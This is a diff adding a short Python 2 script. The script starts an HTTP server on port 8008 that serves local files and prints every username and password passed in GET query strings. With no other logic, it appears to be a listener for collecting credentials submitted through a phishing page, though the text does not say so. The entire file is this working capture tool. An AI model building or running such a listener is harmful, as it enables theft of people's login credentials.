@@ -1,0 +1,14 @@
+from SimpleHTTPServer import SimpleHTTPRequestHandler
+import BaseHTTPServer
+from urlparse import urlparse, parse_qs
+
+class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        query_string = urlparse(self.path).query
+        fields = parse_qs(query_string) if query_string else {}
+        if fields:
+            print ("username = {}, password = {}".format(fields.get('username')[0], fields.get('password')[0]))
+        return (SimpleHTTPRequestHandler.do_GET(self))
+
+if __name__ == '__main__':
+    BaseHTTPServer.HTTPServer(('', 8008), CustomHTTPRequestHandler).serve_forever()
